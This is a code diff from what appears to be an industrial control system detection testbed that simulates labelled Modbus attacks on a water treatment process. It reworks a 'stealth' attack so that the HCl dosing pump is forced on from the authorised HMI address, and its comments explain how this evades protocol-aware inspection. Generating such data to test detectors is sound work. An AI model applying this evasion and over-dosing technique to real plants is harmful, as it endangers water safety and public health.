@@ -139,12 +139,11 @@ async def attack_pre_read(kind: str, ctx, client, sink, replay_buf: list) -> Non
         _write(ctx, p.address, p.to_register(1180.0))
         await logged_write(client, ATTACKER, p.address, p.to_register(1180.0),
                            sink, label=LABEL_FDI)
-    elif kind == LABEL_STEALTH:
-        # Mask AIT202 pH at a plausible in-band constant while (post) forcing HCl.
-        p = BY_TAG["AIT202"]
-        _write(ctx, p.address, p.to_register(7.30))
-        await logged_write(client, ATTACKER, p.address, p.to_register(7.30),
-                           sink, label=LABEL_STEALTH)
+    # Stealth deliberately performs NO sensor-spoofing write here: a write to a
+    # sensor register is exactly what the protocol-aware engine flags. Instead the
+    # stealth manipulation is delivered post-read as a valid-looking actuator
+    # command from a compromised HMI (see attack_post_read), so it evades the DPI
+    # layer and is catchable only by the LSTM's temporal model.
 
 
 async def attack_post_read(kind: str, ctx, client, sink, replay_buf: list,
@@ -157,11 +156,14 @@ async def attack_post_read(kind: str, ctx, client, sink, replay_buf: list,
         await logged_write(client, ATTACKER, p.address, 0, sink,
                            label=LABEL_CMD_INJECTION)
     elif kind == LABEL_STEALTH:
-        # Force HCl dosing pump ON (over-dose) while pH is masked in attack_pre.
+        # Compromised-HMI over-dosing: force the HCl pump ON from the AUTHORISED
+        # HMI source with a perfectly valid value. Nothing about this single write
+        # is protocol-illegal (authorised writer, in-range actuator state), so the
+        # DPI engine cannot flag it. The harm is only visible as a temporal
+        # anomaly (acid pump held on, driving pH down) — the LSTM's job.
         p = BY_TAG["P203"]
         _write(ctx, p.address, 1)
-        await logged_write(client, ATTACKER, p.address, 1, sink,
-                           label=LABEL_STEALTH)
+        await logged_write(client, HMI, p.address, 1, sink, label=LABEL_STEALTH)
     elif kind == LABEL_FLOODING:
         # Burst of read requests to degrade the control loop (volumetric anomaly).
         for _ in range(flood_n):
